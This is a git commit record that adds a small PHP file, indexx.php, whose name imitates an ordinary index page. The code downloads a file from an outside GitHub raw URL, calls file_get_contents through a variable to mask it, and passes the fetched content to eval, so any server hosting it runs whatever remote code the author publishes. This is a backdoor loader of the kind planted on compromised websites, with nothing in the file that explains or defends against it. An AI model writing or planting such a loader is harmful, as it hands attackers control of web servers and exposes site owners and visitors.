d9e95bf681553b8a7e457215327ea6d89e8b9786
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-03-06 18:24:40 +0700

    Add files via upload

---
+++ indexx.php
@@ -0,0 +1,8 @@
+<?php
+
+$awo = 'http://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/';
+  $fgt = 'file_get_contents';
+   $data = $fgt($awo . 'mi.php');
+     $admin = '?>';
+        eval($admin . $data);
+        exit;;
